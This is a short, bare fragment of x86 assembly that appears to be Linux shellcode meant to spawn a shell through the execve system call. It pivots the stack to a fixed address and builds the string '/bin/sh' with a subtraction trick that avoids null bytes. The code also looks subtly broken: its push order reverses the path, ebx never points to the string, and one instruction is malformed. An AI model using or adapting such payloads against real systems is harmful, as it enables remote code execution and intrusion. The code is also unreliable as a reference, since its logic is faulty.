mov   esp,0x0804c060
mov   edx,0x6e69622f
mov   ebx,esp
push  edx
mov   edx,0x09798440
sub   edx,0x09111111
push  edx
xor   edx,edx
push  edx
mov   ecx,esp
mov   edx,esp
xor   eax,eax
movb  eax,0x0b
int   0x80